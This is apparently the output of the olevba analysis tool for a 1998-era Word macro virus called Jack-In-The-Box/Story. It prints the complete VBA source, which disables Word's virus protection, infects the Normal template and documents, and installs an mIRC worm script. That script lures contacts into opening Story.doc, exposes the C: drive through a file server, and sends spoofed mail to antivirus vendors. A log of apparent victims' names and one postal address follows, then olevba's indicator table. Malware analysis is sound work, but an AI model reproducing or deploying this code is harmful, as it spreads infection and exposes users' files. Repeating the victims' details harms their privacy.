olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Story-a92029bc7c717342465dfe5cb4d2ffe350432a35
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Story-a92029bc7c717342465dfe5cb4d2ffe350432a35 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
'Jack-In-The-Box
Set Something = Options
Something.VirusProtection = 0
Something.ConfirmConversions = 0
Something.SaveNormalPrompt = 0
Application.EnableCancelKey = 0
Application.StatusBar = 0
Application.ScreenUpdating = 0
Set AnI = ActiveDocument.VBProject.VBComponents(1)
Set BnI = NormalTemplate.VBProject.VBComponents(1)
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
If UCase(BnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InB = 1
If InA = 1 And InB = 1 Then Exit Sub
Set CnI = MacroContainer.VBProject.VBComponents.Item(1)
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
If InA = 1 Then BnI.CodeModule.AddFromString ("Private Sub Document_Close" & Chr(13) & VCode)
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
NormalTemplate.Save
somename = ActiveDocument.Name
DoEvents
If InB = 1 Then
If Dir("C:\mirc\mirc32.exe") <> "" Then
var3 = "C:\mirc\script.ini"
If System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "warn", "fserve") = "off"
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
If Dir(var3) <> "" Then Kill var3
Open "C:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn d Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
Print #1, "n1=On 1:Input:*:{ Set %var1 $1- | If ( $upper(%var1) = /BY ) { .echo 1Mirc Worm 4Jack-In-The-Box | .echo 12<9<12<9By SimpleSimon12>9>12> | halt } }"
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
Print #1, "n3=On 1:Unotify: .clear -s"
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
Print #1, "n5=On 1:Filercvd:*.*: If ( $me != $nick ) { .dcc send $nick C:\Windows\Story.doc }"
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
DoEvents
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
Print #1, "n8=On 1:Text:*script*:*: .ignore $nick"
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
Print #1, "n10=On 1:Text:*virus*:*: .ignore $nick"
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
Print #1, "n12=On 1:Text:*Jack*Box*:*: .ignore $nick"
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
Print #1, "n14=On 1:Text:*Story.doc*: .ignore $nick"
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
DoEvents
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n17=On 1:Text:*Hey*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
Print #1, "n19=On 1:Sockopen:virc:{ Unset %var2 | Unset %var4 | Unset %var6 | Set %var1 $rand(3, 8) + 1 | Set %loop 1 | Set %var3 0 | :check1 | If ( %loop = %var1 ) { goto out } | If ( %var3 = 0 ) { Set %var2 %var2 $rand(A, Z) } | If ( %var3 = 1 ) { Set %var4 %var4 $rand(A, Z) } | If ( %var3 = 2 ) { Set %var6 %var6 $rand(A, Z) } | If ( %var3 = 2 ) && ( $rand(1, 3) = 2 ) { Set %var6 %var6 $chr(225) } | inc %loop | goto check1 | :out | If ( %var3 = 0 ) { Set %var3 1 | Set %var1 $rand(3, 8) | Set %loop 1 | goto check1 } | If ( %var3 = 1 ) { Set %var3 2 | Set %var1 $rand(5, 50) | Set %loop 1 | goto check1 } | Set %var2 $remove(%var2, $chr(32) ) | Set %var4 $remove(%var4, $chr(32) ) | Set %var5 %var2 @ %var4 .com | Set %var5 $remove(%var5, $chr(32) ) | Set %var6 $remove(%var6, $chr(32) ) | Set %var6 $replace(%var6, $chr(225), $chr(32) ) | If ( %var7 = 6 ) { .sockwrite -n virc Helo %var2 } | .sockwrite -n virc mail from: %var5"
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
Print #1, "n21=On 1:Disconnect:{ If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini } | If ( $exists(C:\Windows\script1.ini) = $true ) { .copy C:\Windows\script1.ini C:\mirc\script.ini | .remove C:\Windows\script1.ini } }"
Close #1
If Dir("C:\windows\Story.doc") = "" Then
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
End If
End If
If Left(somename, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
CommandBars("Tools").Controls("Macro").Enabled = 0
CommandBars("Tools").Controls("Customize...").Enabled = 0
CommandBars("View").Controls("Toolbars").Enabled = 0
CommandBars("View").Controls("Status Bar").Enabled = 0
End Sub




























Private Sub ComboBox1_Change()

End Sub




































































































































































End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 10:18:01 AM - Friday, 22 Jan 1999
' Jeffrey L. Eglen
' Jeffrey L. Eglen
' P.O. Box 381
' Isle of Palms, SC  29451



' 09:19:39 PM - Monday, 25 Jan 1999
' Robert M. Berton
'



' 06:24:59 PM - Monday, 8 Feb 1999
' Andersen Consulting
'



' 06:13:52 PM - Tuesday, 16 Feb 1999
' Natalie Batten
'



' 10:30:17 AM - Monday, 22 Feb 1999
' Kimberly Moore
'



' 02:09:04 PM - Tuesday, 23 Feb 1999
' NC DOT
'



' 03:43:06 PM - Friday, 19 Mar 1999
' GREYNOLDS
'



' 02:05:12 PM - Friday, 9 Apr 1999
' Productivity Services
'



' 07:26:15 AM - Wednesday, 14 Apr 1999
' Roberto Canales
'



' 01:40:45 PM - Monday, 10 May 1999
' Secretary's Office
'



' 01:14:31 PM - Wednesday, 12 May 1999
' Secretary's Office
'



' 02:14:09 PM - Thursday, 13 May 1999
' Secretary's Office
'



' 04:22:49 PM - Wednesday, 19 May 1999
' Jonathan D. Parks
'



' 02:08:06 PM - Thursday, 27 May 1999
' Joan Silvey
'



' 09:58:32 AM - Wednesday, 2 Jun 1999
' CMitchell
'



' 11:25:27 AM - Monday, 26 Jul 1999
' CWarren
'



' 04:31:14 AM - Monday, 22 Nov 1999
' Camille Warren
'
































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |ComboBox1_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
